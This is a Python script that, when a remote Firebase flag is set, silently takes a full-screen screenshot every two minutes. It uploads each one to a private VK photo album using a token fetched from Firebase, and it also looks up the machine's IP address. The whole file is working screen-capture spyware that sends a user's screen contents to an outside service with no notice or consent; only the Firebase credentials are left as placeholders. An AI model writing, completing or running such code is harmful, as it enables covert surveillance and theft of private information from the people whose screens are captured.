import os,time,datetime

import pyautogui

import requests

import vk_api

import firebase_admin
from firebase_admin import credentials
from firebase_admin import db


def current_time():
    timing = time.time()
    value = datetime.datetime.fromtimestamp(timing)
    normal_time = value.strftime('%d-%m-%Y %H:%M:%S')
    normal_date = value.strftime('%d-%m-%Y')
    return [normal_time,normal_date]


#Request for ip
responce = requests.get('https://ipinfo.io').json()

#Firebase init
cert={
  'cert'
}
cred = credentials.Certificate(cert)
url_link='link'
url = {'databaseURL' : url_link}
firebase_admin.initialize_app(cred, url)
ref=db.reference(f"/token")


#Vk api
token=str()
for i in ref.get().items():
    token=list(i)[1]['token']
session = vk_api.VkApi(token=token)
vk = session.get_api()


def album_check():
    global album,lst,name
    for i in vk.photos.getAlbums()['items']:
        if i['title']!=f'{name}_({current_time()[1]})':
            lst.append('False')
        else:
            lst.append('True')
            album=i
    if not 'True' in lst:
        vk.photos.createAlbum(title=f'{name}_({current_time()[1]})', privacy_view=['only_me'])
        for i in vk.photos.getAlbums()['items']:
            if i['title'] == f'{name}_({current_time()[1]})':
                album = i
            else:
                pass


def message_send():
    global album
    if album['title']==f'{name}_({current_time()[1]})':
        try:
            server=vk.photos.getUploadServer(album_id=album['id'])
            r=requests.post(server['upload_url'], files={'photo': open('screen.png', 'rb')}).json()
            vk.photos.save(album_id=album['id'], server=r['server'], hash=r['hash'], photos_list=r['photos_list'])
        except vk_api.exceptions.ApiError:
            album_check()


def screen_shot():
    scr = pyautogui.screenshot()
    try:
        os.remove(f'screen.png')
    except FileNotFoundError:
        pass
    scr.save(f'screen.png')
    message_send()
    os.remove(f'screen.png')


name=str()
with open('name.txt', 'r') as file:
    for f in file:
        name=f
lst=[]
album={}
try:
    album_check()
except Exception:
    exit()
var=int(time.time())
while True:
    start = db.reference("/statement_screen")
    for i in start.get().items():
        state = bool(int(list(i)[1]['state']))
    if state:
        count=int(time.time())
        if count-var>120:
            screen_shot()
            var=count
    else:
        pass

